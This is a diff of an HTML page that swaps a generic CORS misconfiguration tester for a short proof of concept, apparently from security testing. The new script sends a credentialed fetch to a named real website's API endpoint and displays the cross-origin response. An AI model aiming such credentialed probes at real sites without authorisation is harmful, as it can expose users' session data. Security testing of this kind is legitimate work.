@@ -1,78 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>CORS Misconfiguration Tester</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-
-<style>
-body {
-    background: #111;
-    color: #0f0;
-    font-family: Consolas, monospace;
-    padding: 20px;
-}
-input, select, button {
-    padding: 10px;
-    margin: 5px 0;
-    width: 100%;
-    background: #000;
-    color: #0f0;
-    border: 1px solid #0f0;
-}
-pre {
-    background: #000;
-    padding: 10px;
-    border: 1px solid #0f0;
-    overflow-x: auto;
-}
-</style>
-</head>
+<html>
 <body>
-
-<h2>CORS Misconfiguration Tester</h2>
-
-<label>Target URL:</label>
-<input id="url" type="text" placeholder="https://example.com/api">
-
-<label>Method:</label>
-<select id="method">
-    <option>GET</option>
-    <option>POST</option>
-</select>
-
-<label>Send credentials?</label>
-<select id="creds">
-    <option value="include">Yes (include cookies)</option>
-    <option value="omit">No</option>
-</select>
-
-<label>POST Body (optional):</label>
-<textarea id="postdata" rows="3" placeholder='{ "test": "poc" }'></textarea>
-
-<button onclick="runTest()">Run CORS Test</button>
-
-<h3>Response Headers:</h3>
-<pre id="headers"></pre>
-
-<h3>Body (if allowed by CORS):</h3>
-<pre id="body"></pre>
+<h2>CORS Response Output:</h2>
+<pre id="output" style="white-space: pre-wrap; border: 1px solid #000; padding: 10px;"></pre>
 
 <script>
-fetch("https://www.viator.com/intake/v2/rum/events", {
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
-    headers: {
-        "Content-Type": "application/x-ndjson"
-    },
-    body: "test"
+fetch("https://baryon.viator.com/ha/chat/availability/SALES?locale=en", {
+    credentials: "include"
 })
-.then(r => r.text())
-.then(t => console.log("SUCCESS:", t))
-.catch(e => console.log("BLOCKED:", e));
+.then(async resp => {
+    let text = await resp.text();
+    try {
+        let json = JSON.parse(text);
+        text = JSON.stringify(json, null, 4); // pretty print
+    } catch (e) {}
+    document.getElementById("output").textContent = text;
+});
 </script>
-
-
 </body>
 </html>
